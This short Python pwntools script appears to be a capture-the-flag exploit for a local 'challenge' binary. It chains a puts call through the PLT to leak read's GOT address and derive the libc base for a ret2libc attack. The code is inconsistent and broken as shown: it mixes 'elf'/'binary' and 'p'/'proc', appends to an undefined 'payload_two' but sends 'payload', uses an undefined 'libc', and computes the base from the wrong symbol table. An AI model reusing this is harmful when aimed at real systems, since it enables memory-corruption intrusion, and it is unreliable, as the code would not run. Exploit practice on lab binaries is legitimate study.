from pwn import *

elf = ELF("./challenge", checksec=False)
p = process()

payload_two += p32(binary.plt["puts"])  # calling PLT puts
payload_two += p32(binary.sym["main"])  # return address
payload_two += p32(binary.got["read"])  # arg0 for puts

p.sendafter(b"enter data: ", payload)
leak = u32(proc.recvn(4))  # grabbing the libc read leak
print(leak)

# this could be used to calculate the base address of libc
libc.address = leak - binary.sym["read"]
